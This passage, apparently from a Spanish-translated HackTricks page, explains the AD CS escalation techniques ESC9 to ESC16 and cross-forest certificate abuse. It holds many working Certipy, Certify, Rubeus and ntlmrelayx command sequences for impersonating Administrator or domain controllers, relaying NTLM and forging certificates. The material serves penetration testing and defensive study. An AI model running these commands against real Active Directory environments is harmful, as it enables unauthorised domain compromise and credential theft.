Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo intencionadamente la parte del dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificación no viola las restricciones, dado que `Administrator@corp.local` sigue siendo distinto como el `userPrincipalName` de `Administrator`.

A continuación, se solicita la plantilla de certificado `ESC9`, marcada como vulnerable, como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Se observa que el `userPrincipalName` del certificado refleja `Administrator`, sin ningún “object SID”.

El `userPrincipalName` de `Jane` se revierte a su original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Intentar la autenticación con el certificado emitido ahora produce el hash NT de `Administrator@corp.local`. El comando debe incluir `-domain <domain>` debido a la falta de especificación de dominio en el certificado:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mapeos de Certificados Débiles - ESC10

### Explicación

Dos valores de clave de registro en el controlador de dominio se refieren a ESC10:

- El valor predeterminado para `CertificateMappingMethods` bajo `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` es `0x18` (`0x8 | 0x10`), anteriormente configurado como `0x1F`.
- La configuración predeterminada para `StrongCertificateBindingEnforcement` bajo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` es `1`, anteriormente `0`.

**Caso 1**

Cuando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Si `CertificateMappingMethods` incluye el bit `UPN` (`0x4`).

### Caso de Abuso 1

Con `StrongCertificateBindingEnforcement` configurado como `0`, una cuenta A con permisos de `GenericWrite` puede ser explotada para comprometer cualquier cuenta B.

Por ejemplo, teniendo permisos de `GenericWrite` sobre `Jane@corp.local`, un atacante busca comprometer `Administrator@corp.local`. El procedimiento refleja ESC9, permitiendo que se utilice cualquier plantilla de certificado.

Inicialmente, el hash de `Jane` se recupera utilizando Credenciales en Sombra, explotando el `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se altera a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de restricciones.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
A continuación, se solicita un certificado que habilite la autenticación del cliente como `Jane`, utilizando la plantilla `User` predeterminada.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se revierte a su original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticar con el certificado obtenido generará el hash NT de `Administrator@corp.local`, lo que requiere especificar el dominio en el comando debido a la ausencia de detalles del dominio en el certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de abuso 2

Con el `CertificateMappingMethods` que contiene el bit flag `UPN` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que carezca de la propiedad `userPrincipalName`, incluidas las cuentas de máquina y el administrador de dominio incorporado `Administrator`.

Aquí, el objetivo es comprometer `DC$@corp.local`, comenzando por obtener el hash de `Jane` a través de Shadow Credentials, aprovechando el `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
El `userPrincipalName` de `Jane` se establece en `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Se solicita un certificado para la autenticación del cliente como `Jane` utilizando la plantilla `User` predeterminada.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se revierte a su original después de este proceso.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticar a través de Schannel, se utiliza la opción `-ldap-shell` de Certipy, indicando el éxito de la autenticación como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
A través de la shell LDAP, comandos como `set_rbcd` habilitan ataques de Delegación Constrainida Basada en Recursos (RBCD), comprometiendo potencialmente el controlador de dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o donde no coincida con el `sAMAccountName`, siendo el `Administrator@corp.local` el objetivo principal debido a sus privilegios LDAP elevados y la ausencia de un `userPrincipalName` por defecto.

## Relaying NTLM to ICPR - ESC11

### Explicación

Si el servidor CA no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, puede realizar ataques de relé NTLM sin firmar a través del servicio RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado y certipy mostrará las vulnerabilidades `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Escenario de abuso

Es necesario configurar un servidor de retransmisión:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para los controladores de dominio, debemos especificar `-template` en DomainController.

O usando [el fork de impacket de sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Acceso a shell a ADCS CA con YubiHSM - ESC12

### Explicación

Los administradores pueden configurar la Autoridad de Certificación para almacenarla en un dispositivo externo como el "Yubico YubiHSM2".

Si el dispositivo USB está conectado al servidor CA a través de un puerto USB, o a un servidor de dispositivo USB en caso de que el servidor CA sea una máquina virtual, se requiere una clave de autenticación (a veces denominada "contraseña") para que el Proveedor de Almacenamiento de Claves genere y utilice claves en el YubiHSM.

Esta clave/contraseña se almacena en el registro bajo `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` en texto claro.

Referencia en [aquí](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Escenario de abuso

Si la clave privada de la CA está almacenada en un dispositivo USB físico cuando obtuviste acceso a shell, es posible recuperar la clave.

Primero, necesitas obtener el certificado de la CA (esto es público) y luego:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finalmente, utiliza el comando certutil `-sign` para falsificar un nuevo certificado arbitrario utilizando el certificado de CA y su clave privada.

## Abuso de enlace de grupo OID - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite que la política de emisión se agregue a la plantilla del certificado. Los objetos `msPKI-Enterprise-Oid` que son responsables de emitir políticas se pueden descubrir en el Contexto de Nombres de Configuración (CN=OID,CN=Public Key Services,CN=Services) del contenedor OID de PKI. Una política se puede vincular a un grupo de AD utilizando el atributo `msDS-OIDToGroupLink` de este objeto, lo que permite a un sistema autorizar a un usuario que presenta el certificado como si fuera un miembro del grupo. [Referencia aquí](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

En otras palabras, cuando un usuario tiene permiso para inscribir un certificado y el certificado está vinculado a un grupo OID, el usuario puede heredar los privilegios de este grupo.

Utiliza [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Escenario de abuso

Encuentra un permiso de usuario que se pueda usar `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permiso para inscribir `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.

Todo lo que necesita hacer es especificar la plantilla, obtendrá un certificado con derechos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuración de Renovación de Certificados Vulnerable - ESC14

### Explicación

La descripción en https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping es notablemente completa. A continuación se presenta una cita del texto original.

ESC14 aborda las vulnerabilidades que surgen de "mapeo de certificados explícitos débiles", principalmente a través del uso indebido o la configuración insegura del atributo `altSecurityIdentities` en cuentas de usuario o computadora de Active Directory. Este atributo de múltiples valores permite a los administradores asociar manualmente certificados X.509 con una cuenta de AD para fines de autenticación. Cuando se completa, estos mapeos explícitos pueden anular la lógica de mapeo de certificados predeterminada, que generalmente se basa en UPNs o nombres DNS en el SAN del certificado, o el SID incrustado en la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`.

Un mapeo "débil" ocurre cuando el valor de cadena utilizado dentro del atributo `altSecurityIdentities` para identificar un certificado es demasiado amplio, fácilmente adivinable, se basa en campos de certificado no únicos o utiliza componentes de certificado fácilmente suplantables. Si un atacante puede obtener o crear un certificado cuyos atributos coincidan con un mapeo explícito definido débil para una cuenta privilegiada, puede usar ese certificado para autenticarse como y suplantar esa cuenta.

Ejemplos de cadenas de mapeo `altSecurityIdentities` potencialmente débiles incluyen:

- Mapeo únicamente por un Nombre Común de Sujeto (CN) común: p. ej., `X509:<S>CN=SomeUser`. Un atacante podría obtener un certificado con este CN de una fuente menos segura.
- Uso de Nombres Distinguibles de Emisor (DNs) o DNs de Sujeto demasiado genéricos sin más calificación, como un número de serie específico o un identificador de clave de sujeto: p. ej., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Empleo de otros patrones predecibles o identificadores no criptográficos que un atacante podría satisfacer en un certificado que puede obtener legítimamente o falsificar (si ha comprometido una CA o encontrado una plantilla vulnerable como en ESC1).

El atributo `altSecurityIdentities` admite varios formatos para el mapeo, tales como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapea por el DN completo de Emisor y Sujeto)
- `X509:<SKI>SubjectKeyIdentifier` (mapea por el valor de la extensión de Identificador de Clave de Sujeto del certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapea por número de serie, calificado implícitamente por el DN del Emisor) - este no es un formato estándar, generalmente es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapea por un nombre RFC822, típicamente una dirección de correo electrónico, del SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapea por un hash SHA1 de la clave pública en bruto del certificado - generalmente fuerte)

La seguridad de estos mapeos depende en gran medida de la especificidad, unicidad y fuerza criptográfica de los identificadores de certificado elegidos utilizados en la cadena de mapeo. Incluso con modos de enlace de certificado fuertes habilitados en los Controladores de Dominio (que afectan principalmente a los mapeos implícitos basados en UPNs/DNS del SAN y la extensión SID), una entrada `altSecurityIdentities` mal configurada aún puede presentar un camino directo para la suplantación si la lógica de mapeo en sí es defectuosa o demasiado permisiva.

### Escenario de Abuso

ESC14 apunta a **mapeos de certificados explícitos** en Active Directory (AD), específicamente el atributo `altSecurityIdentities`. Si este atributo está configurado (por diseño o mala configuración), los atacantes pueden suplantar cuentas presentando certificados que coincidan con el mapeo.

#### Escenario A: El Atacante Puede Escribir en `altSecurityIdentities`

**Precondición**: El atacante tiene permisos de escritura en el atributo `altSecurityIdentities` de la cuenta objetivo o el permiso para otorgarlo en forma de uno de los siguientes permisos en el objeto AD objetivo:
- Escribir propiedad `altSecurityIdentities`
- Escribir propiedad `Public-Information`
- Escribir propiedad (todas)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Escenario B: El Objetivo Tiene un Mapeo Débil a través de X509RFC822 (Correo)

- **Precondición**: El objetivo tiene un mapeo débil X509RFC822 en `altSecurityIdentities`. Un atacante puede establecer el atributo de correo de la víctima para que coincida con el nombre X509RFC822 del objetivo, inscribir un certificado como la víctima y usarlo para autenticarse como el objetivo.

#### Escenario C: El Objetivo Tiene un Mapeo X509IssuerSubject

- **Precondición**: El objetivo tiene un mapeo explícito débil X509IssuerSubject en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` en un principal víctima para que coincida con el sujeto del mapeo X509IssuerSubject del objetivo. Luego, el atacante puede inscribir un certificado como la víctima y usar este certificado para autenticarse como el objetivo.

#### Escenario D: El Objetivo Tiene un Mapeo X509SubjectOnly

- **Precondición**: El objetivo tiene un mapeo explícito débil X509SubjectOnly en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` en un principal víctima para que coincida con el sujeto del mapeo X509SubjectOnly del objetivo. Luego, el atacante puede inscribir un certificado como la víctima y usar este certificado para autenticarse como el objetivo.

### operaciones concretas
#### Escenario A

Solicitar un certificado de la plantilla de certificado `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Guardar y convertir el certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticar (usando el certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpieza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Para métodos de ataque más específicos en varios escenarios de ataque, consulte lo siguiente: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## Políticas de Aplicación EKUwu (CVE-2024-49019) - ESC15

### Explicación

La descripción en https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc es notablemente completa. A continuación se presenta una cita del texto original.

Usando plantillas de certificados de versión 1 predeterminadas integradas, un atacante puede crear un CSR para incluir políticas de aplicación que son preferidas sobre los atributos de Uso de Clave Extendida configurados en la plantilla. El único requisito son los derechos de inscripción, y se puede utilizar para generar certificados de autenticación de cliente, agente de solicitud de certificado y firma de código utilizando la plantilla **_WebServer_**.

### Abuso

Lo siguiente se refiere a [este enlace](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), haga clic para ver métodos de uso más detallados.

El comando `find` de Certipy puede ayudar a identificar plantillas V1 que son potencialmente susceptibles a ESC15 si la CA no está parcheada.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Escenario A: Suplantación Directa a través de Schannel

**Paso 1: Solicitar un certificado, inyectando la política de aplicación "Autenticación de Cliente" y el UPN objetivo.** El atacante `attacker@corp.local` tiene como objetivo `administrator@corp.local` utilizando la plantilla "WebServer" V1 (que permite un sujeto proporcionado por el inscrito).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: La plantilla vulnerable V1 con "El solicitante proporciona el sujeto".
- `-application-policies 'Client Authentication'`: Inyecta el OID `1.3.6.1.5.5.7.3.2` en la extensión de Políticas de Aplicación del CSR.
- `-upn 'administrator@corp.local'`: Establece el UPN en el SAN para suplantación.

**Paso 2: Autenticarse a través de Schannel (LDAPS) utilizando el certificado obtenido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Paso 1: Solicitar un certificado de una plantilla V1 (con "El solicitante proporciona el sujeto"), inyectando la política de aplicación "Agente de Solicitud de Certificado".** Este certificado es para el atacante (`attacker@corp.local`) para convertirse en un agente de inscripción. No se especifica un UPN para la propia identidad del atacante aquí, ya que el objetivo es la capacidad de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inyecta OID `1.3.6.1.4.1.311.20.2.1`.

**Paso 2: Usa el certificado "agent" para solicitar un certificado en nombre de un usuario privilegiado objetivo.** Este es un paso similar a ESC3, utilizando el certificado del Paso 1 como el certificado agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Paso 3: Autenticarse como el usuario privilegiado utilizando el certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extensión de Seguridad Desactivada en CA (Globalmente)-ESC16

### Explicación

**ESC16 (Elevación de Privilegios a través de la Falta de la Extensión szOID_NTDS_CA_SECURITY_EXT)** se refiere al escenario donde, si la configuración de AD CS no obliga la inclusión de la **szOID_NTDS_CA_SECURITY_EXT** en todos los certificados, un atacante puede explotar esto al:

1. Solicitar un certificado **sin enlace SID**.

2. Usar este certificado **para autenticarse como cualquier cuenta**, como suplantar una cuenta de alto privilegio (por ejemplo, un Administrador de Dominio).

También puedes consultar este artículo para aprender más sobre el principio detallado: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

Lo siguiente se refiere a [este enlace](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Haz clic para ver métodos de uso más detallados.

Para identificar si el entorno de Servicios de Certificados de Active Directory (AD CS) es vulnerable a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Paso 1: Leer el UPN inicial de la cuenta de la víctima (Opcional - para restauración).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Paso 2: Actualiza el UPN de la cuenta de la víctima al `sAMAccountName` del administrador objetivo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Paso 3: (Si es necesario) Obtén credenciales para la cuenta "víctima" (por ejemplo, a través de Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Paso 4: Solicitar un certificado como el usuario "víctima" de _cualquier plantilla de autenticación de cliente adecuada_ (por ejemplo, "Usuario") en la CA vulnerable a ESC16.** Debido a que la CA es vulnerable a ESC16, omitirá automáticamente la extensión de seguridad SID del certificado emitido, independientemente de la configuración específica de la plantilla para esta extensión. Establezca la variable de entorno del caché de credenciales de Kerberos (comando de shell):
```bash
export KRB5CCNAME=victim.ccache
```
Luego solicita el certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Paso 5: Revertir el UPN de la cuenta "víctima".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Paso 6: Autenticarse como el administrador objetivo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Comprometiendo Bosques con Certificados Explicados en Voz Pasiva

### Ruptura de Confianzas de Bosque por CAs Comprometidos

La configuración para **inscripción entre bosques** es relativamente sencilla. El **certificado CA raíz** del bosque de recursos es **publicado en los bosques de cuentas** por los administradores, y los certificados de **CA empresarial** del bosque de recursos son **agregados a los contenedores `NTAuthCertificates` y AIA en cada bosque de cuentas**. Para aclarar, este arreglo otorga al **CA en el bosque de recursos control total** sobre todos los demás bosques para los cuales gestiona PKI. Si este CA es **comprometido por atacantes**, los certificados para todos los usuarios en ambos, el bosque de recursos y los bosques de cuentas, podrían ser **falsificados por ellos**, rompiendo así el límite de seguridad del bosque.

### Privilegios de Inscripción Otorgados a Principales Extranjeros

En entornos de múltiples bosques, se requiere precaución con respecto a las CAs Empresariales que **publican plantillas de certificados** que permiten a **Usuarios Autenticados o principales extranjeros** (usuarios/grupos externos al bosque al que pertenece la CA Empresarial) **derechos de inscripción y edición**.\
Tras la autenticación a través de una confianza, el **SID de Usuarios Autenticados** es agregado al token del usuario por AD. Así, si un dominio posee una CA Empresarial con una plantilla que **permite derechos de inscripción a Usuarios Autenticados**, una plantilla podría potencialmente ser **inscrita por un usuario de un bosque diferente**. Del mismo modo, si **los derechos de inscripción son explícitamente otorgados a un principal extranjero por una plantilla**, se **crea así una relación de control de acceso entre bosques**, permitiendo a un principal de un bosque **inscribirse en una plantilla de otro bosque**.

Ambos escenarios conducen a un **aumento en la superficie de ataque** de un bosque a otro. La configuración de la plantilla de certificado podría ser explotada por un atacante para obtener privilegios adicionales en un dominio extranjero.


## Referencias

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)

{{#include ../../../banners/hacktricks-training.md}}
